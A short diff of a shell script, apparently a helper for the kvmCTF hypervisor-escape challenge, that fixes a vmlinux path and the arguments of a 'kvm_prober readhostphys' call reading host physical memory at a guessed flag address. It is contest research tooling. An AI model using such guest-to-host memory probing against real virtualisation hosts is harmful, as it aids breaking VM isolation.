@@ -38,7 +38,7 @@ sleep 2
      echo "[*] Downloading latest kvmctf bundle for vmlinux..."
      wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
      tar -xzf latest.tar.gz
-     mv /root/kvm_probe/kvmctf-6.1.74/vmlinux/vmlinux /root
+     mv /root/kvmprobes/kvmctf-6.1.74/vmlinux/vmlinux /root
      echo "[+] vmlinux moved to /root"
  else
      echo "[+] /root/vmlinux already exists, skipping download."
@@ -122,4 +122,4 @@ echo "potential write_flag address 0x632cf9a8"
 sleep 5
 
 echo "[*] testing kvm_prober readhostphys 0x632cf9a8 64"
-kvm_prober readhostphys  4096
+kvm_prober readhostphys 0x632cf9a8 4096
